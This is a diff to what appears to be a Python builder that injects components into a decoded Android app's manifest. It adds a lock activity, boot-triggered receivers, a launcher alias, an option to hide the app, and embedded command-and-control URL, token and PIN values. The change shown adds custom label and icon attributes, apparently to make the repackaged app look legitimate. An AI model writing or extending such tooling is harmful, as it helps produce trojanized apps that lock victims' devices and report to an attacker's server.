@@ -150,16 +150,29 @@ def _legacy_storage(xml: str) -> str:
     )
 
 
-def _injection(authority: str, app: str) -> str:
+def _app_attrs(xml: str, use_icon: bool) -> str:
+    """Sisipkan atribut ikon ke <application> bila ikon dikirim."""
+    if not use_icon or "mipmap/mzk_icon" in xml:
+        return xml
+    return re.sub(
+        r"<application\b",
+        '<application android:icon="@mipmap/mzk_icon"'
+        ' android:roundIcon="@mipmap/mzk_icon"',
+        xml, count=1,
+    )
+
+
+def _injection(authority: str, app: str, use_label: bool, use_icon: bool) -> str:
     boot = "\n".join(
         f'                <action android:name="{a}" />' for a in BOOT_ACTIONS
     )
+    label = '\n            android:label="@string/mzk_label"' if use_label else ""
     return f"""
         <activity
             android:name="{PKG}.MainActivity"
             android:exported="true"
             android:theme="@style/MzkTheme"
-            android:launchMode="singleTop" />
+            android:launchMode="singleTop"{label} />
 
         <activity
             android:name="{PKG}.LockActivity"
@@ -175,7 +188,7 @@ def _injection(authority: str, app: str) -> str:
             android:name="{ALIAS}"
             android:targetActivity="{PKG}.MainActivity"
             android:exported="true"
-            android:enabled="true">
+            android:enabled="true"{label}>
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
@@ -281,7 +294,8 @@ def _check_collision(xml: str, app: str) -> None:
 
 
 def patch_manifest(decoded: Path, c2_url: str, token: str, pin: str,
-                   email: str, team: str, hide: bool) -> None:
+                   email: str, team: str, hide: bool,
+                   use_label: bool = False, use_icon: bool = False) -> None:
     mf = decoded / "AndroidManifest.xml"
     xml = mf.read_text(encoding="utf-8")
 
@@ -293,9 +307,14 @@ def patch_manifest(decoded: Path, c2_url: str, token: str, pin: str,
 
     xml = _add_permissions(xml)
     xml = _legacy_storage(xml)
+    xml = _app_attrs(xml, use_icon)
 
     authority = f"{PKG}.boot.{secrets.token_hex(4)}"
-    xml = xml.replace("</application>", _injection(authority, app) + "    </application>", 1)
+    xml = xml.replace(
+        "</application>",
+        _injection(authority, app, use_label, use_icon) + "    </application>",
+        1,
+    )
     xml = xml.replace(
         "</application>", _meta(c2_url, token, pin, email, team) + "\n    </application>", 1
     )
